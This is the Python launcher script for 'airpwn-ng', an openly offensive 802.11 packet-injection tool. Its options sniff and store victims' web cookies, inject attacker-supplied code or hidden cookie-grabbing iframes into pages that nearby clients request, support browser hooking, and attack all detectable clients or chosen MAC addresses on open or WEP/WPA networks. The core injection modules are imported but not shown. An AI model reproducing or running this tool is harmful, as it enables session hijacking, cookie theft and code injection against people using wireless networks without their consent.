#! /usr/bin/python2.7

import logging, subprocess, os, sys, argparse, signal
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from lib.logger import Database, Tee as tee
from lib.styles import Web, Inject
from lib.victim import Victim
from lib.visuals import bcolors

def crtlC(args):
    """Handle CTRL+C."""
    def tmp(signal, frame):
        print(bcolors.FAIL + '\n[!] Stopping injection and exiting airpwn-ng ...' + bcolors.ENDC)
        print(bcolors.OKGREEN + '\n[+] Cookies stored to ' + bcolors.WARNING + 'cookies.log ' + bcolors.OKGREEN +  'and ' + bcolors.WARNING + 'cookies.sqlite' + bcolors.ENDC)
        if args.o:
            print(bcolors.OKGREEN + '\n[+] Output log stored to ' + bcolors.WARNING + '%s' + bcolors.ENDC) % args.o
        sys.exit(0)
    return tmp


def injection_check(args):
    """Injection file -OR- Website list decision logic"""
    ## Use injection file
    if (args.injection is not None):
        try:
            f = open (args.injection, 'r')
            f.close()
        except:
            print bcolors.FAIL + "[!] Selected injection file", args.injection, "does not exist." + bcolors.ENDC
            exit(1)
        print bcolors.OKGREEN+"[+] Loaded injection file", args.injection + bcolors.ENDC
        injection = 1
        websites = None
        return injection, websites

    ## Use website list
    else:
        try:
            f = open(args.websites, 'r')
            f.close()
        except:
            print bcolors.FAIL + "[!] Selected websites file", args.websites, "does not exist." + bcolors.ENDC
            exit(1)
        injection = 0
        websites = load_websites_targeted(args.websites)
        for website in websites:
            print bcolors.OKGREEN + "[+] Loaded target website ", website + bcolors.ENDC
        return injection, websites


def load_websites_targeted(websites_file):
    """Load websites from a file to a List object.
    
    Ignore lines starting with #.
    """
    websites = []
    with open(websites_file, 'r') as f:
        for line in f.readlines():
            if (line.strip()[0] != "#"):
                websites.append(line.strip())
    return websites


def main(args):
    """Launching logic"""
    ## Logging
    if args.o:
        stdOut = sys.stdout
        sys.stdout = sys.stderr
        sys.stderr = stdOut
        oLog = open(args.o, 'w')
        sys.stdout = tee(stdOut, oLog)
    
    ## Cookie extractor
    if args.cm:
        db = Database(args.cm)
        db.extract_cookies()
        exit(0)

    ## Set vars
    m_iface = args.m
    i_iface = args.i
    injection = 0
    
    ## User printouts
    os.system('clear')
    print "\nairpwn-ng - The new and improved 802.11 packet injector\n"
    if ("mon" in m_iface and m_iface != i_iface):
        print bcolors.WARNING + "[!] It appears you are using a monitor mode interface as your monitoring input. If you are attacking open wireless networks, please use the same monitoring interface with -i for better performance." + bcolors.ENDC
    if ("mon" not in m_iface):
        print bcolors.WARNING + "[!] It appears your are trying to attack a WEP/WPA protected network. Please ensure -m is your dot11 tap interface and that -i is connected to the target AP." + bcolors.ENDC

    ### NOT IMPLEMENTED YET
    ## Whitelist checks
    #if (args.exclude_hosts is not None):
        #EXCLUSION = 1
        #EXCLUDE_LIST = args.exclude_hosts

    ## Injection Logic
    injection, websites = injection_check(args)

    if args.t is None:
        ## Broadcast mode
        print bcolors.WARNING + "[!] You are starting your attack in broadcast mode. This means you will inject packets into all clients you are able to detect. Use with caution." + bcolors.ENDC
    else:
        ## Targeted mode
        if (len(args.t) == 0):
            print bcolors.WARNING + "[!] You must specify at least one target MAC address with -t for targeted mode"
            exit(1)
        else:
            for target in args.t:
                print bcolors.OKGREEN + "[+] Adding target", target + bcolors.ENDC

    if injection == 1:
        ## Injection file used
        i = Inject()
        i.style_inject(args)

    else:
        ## Website file used
        w = Web()
        w.style_web(args, websites)


def menu():
    if len(sys.argv) > 1:
        pass
    else:
        print 'airpwn-ng - the new and improved 802.11 packet injector'
        print ''
        print '******************************************************'
        print '**                 Launcher Choices                 **'
        print '******************************************************'
        print '  Choose from 1 of the following:'
        print '    --injection <filename>'
        print '      File with your injection code'
        print ''
        print '    --websites <filename>'
        print '      List of websites to sniff cookies from'
        print ''
        print '    --cm'
        print '      Extract cookies from the DB'
        print ''
        print '******************************************************'
        print '**                Optional Arguments                **'
        print '******************************************************'
        print '  -b'
        print '    Sniff cookies both ways'
        print '    ***Packet injection becomes slower***'
        print ''
        print '  -i <interface>'
        print '     Your injection interface'
        print ''
        print '  -m <interface>'
        print '     Your monitor interface'
        print ''
        print '  -o <output file'
        print '     Create logfile of stdout and stderr'
        print ''
        print '  -t [<MAC MAC>]'
        print '     Targeted MACs'
        print ''
        print '  -v'
        print '    Print packet load'
        print ''
        print '  --exclude-hosts [<host host>]'
        print '    Hosts to exclude from injection'
        print ''
        print '  --covert'
        print '    Hide iFrames inside the requested page'
        print ''
        print ' --trigger <string>'
        print '    String to trigger injection on [Default is: GET /]'
        print ''
        print '  --single'
        print '    Beta method for beef hooking'
        sys.exit(0)



if __name__ == '__main__':
    ## ARGUMENT PARSING
    parser = argparse.ArgumentParser(description = 'airpwn-ng - the new and improved 802.11 packet injector', usage = menu())

    group = parser.add_mutually_exclusive_group(required = True)

    group.add_argument('--injection', metavar = '<filename>', help = 'File with your injection code')
    group.add_argument('--websites', metavar = '<filename>', help = 'List of websites to sniff cookies from')
    group.add_argument('--cm', metavar = '<filename>', help = 'Extract cookies from the DB')

    parser.add_argument('-b', action = 'store_true', help = 'Sniff both ways')
    parser.add_argument('-i', metavar = '<interface>', help = 'Your injection interface')
    parser.add_argument('-m', metavar = '<interface>', help = 'Your monitor interface')
    parser.add_argument('-o', metavar = '<outfile>', help = 'Output File')
    parser.add_argument('-t', nargs = '*', metavar = '<MAC address>', help = 'Target MAC addresses')
    parser.add_argument('-v', action = 'store_true', help = 'Verbose packet output')
    parser.add_argument('--exclude-hosts', nargs = '*', metavar = '<host>', help = 'Space separated list of hosts/IP addresses to exclude from injection')
    parser.add_argument('--covert', action = 'store_true', help = 'Hides cookie grabbing iframes inside the requested page')
    parser.add_argument('--trigger', metavar = '<trigger>', help = 'Trigger string for injection')
    parser.add_argument('--single', action = 'store_true', help = 'Single packet injection attempt')
    args = parser.parse_args()

    ## ADD GLOBAL SIGNAL HANDLER
    signal_handler = crtlC(args)
    signal.signal(signal.SIGINT, signal_handler)

    print args
    main(args)
